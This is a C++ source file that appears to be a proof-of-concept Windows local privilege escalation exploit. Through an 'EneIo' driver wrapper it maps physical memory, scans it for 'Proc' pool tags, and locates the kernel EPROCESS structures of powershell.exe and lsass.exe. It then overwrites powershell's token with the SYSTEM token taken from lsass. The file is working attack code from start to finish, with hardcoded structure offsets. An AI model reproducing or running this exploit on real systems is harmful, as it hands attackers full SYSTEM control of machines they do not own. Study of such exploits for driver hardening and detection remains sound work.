#include "EneIo.h"

typedef struct _POOL_HEADER
{
	ULONG Ulong1;
	ULONG PoolTag;
} POOL_HEADER, * PPOOL_HEADER;

typedef struct _EX_FAST_REF {
	union {
		PVOID Object;
		ULONG_PTR RefCnt : 3;
		ULONG_PTR Value;
	};
} EX_FAST_REF, * PEX_FAST_REF;

int main()
{
	EneIo ene;

	// Create input buffer
	SECTION_MAP_INFO mapInfo = { 0 };
	mapInfo.CommitSize = static_cast<QWORD>(1024 * 1024 * 1024) * 9;

	// Map around 9 GB of memory
	ene.MapViewOfSection(mapInfo);
	printf("[+] View of 0x%llx bytes mapped at %p\n", mapInfo.CommitSize, mapInfo.BaseAddress);

	// Pool tag value
	uint32_t PoolTagValue = 0x636f7250;

	// EPROCESS offsets
	uint64_t UniqueProcessId = 0x440;
	uint64_t ImageFileName = 0x5a8;
	uint64_t Token = 0x4b8;

	// Save eprocess addresses
	uint64_t eprocess_powershell = 0x0;
	uint64_t eprocess_lsass = 0x0;

	PPOOL_HEADER ph;
	uint8_t* base = (uint8_t*)mapInfo.BaseAddress;
	printf("[+] Scanning for EPROCESS addresses...\n");

	// Iterate over mapped memory and look for pool header value. Pool headers are 0x10 hex aligned.
	for (uint64_t i = 0x0; i < mapInfo.CommitSize; i += 0x10) {
		// Read pool header
		ph = (POOL_HEADER*)(base + i);
		
		// Check if tag matches
		if (ph->PoolTag == PoolTagValue) {

			// Calculate location of EPROCESS. Header size is 0x70 for lsass.exe and 0x80 for powershell.exe
			for (uint64_t headersize = 0x70; headersize <= 0x80; headersize += 0x10) {
				uint64_t eprocess = (uint64_t)(base + i + headersize);
				const char* name = (const char*)(eprocess + ImageFileName);

				// Filter other processes and invalid data
				if (!strcmp(name, "powershell.exe")) {
					printf("[+] Found powershell.exe at %p\n", eprocess);
					eprocess_powershell = eprocess;
				}

				if (!strcmp(name, "lsass.exe")) {
					printf("[+] Found lsass.exe at %p\n", eprocess);
					eprocess_lsass = eprocess;
				}
			}
		}

		// Found both EPROCESS addresses, overwrite token with SYSTEM token from lsass.exe
		if (eprocess_powershell && eprocess_lsass) {
			printf("[+] Hijacking token...\n");
			EX_FAST_REF lsass_token = *(EX_FAST_REF*)(eprocess_lsass + Token);
			EX_FAST_REF powershell_token = *(EX_FAST_REF*)(eprocess_powershell + Token);

			powershell_token.Value = lsass_token.Value;
			*(EX_FAST_REF*)(eprocess_powershell + Token) = powershell_token;
			break;
		}
	}

	ene.UnmapViewOfSection(mapInfo);
	
	return 0;
}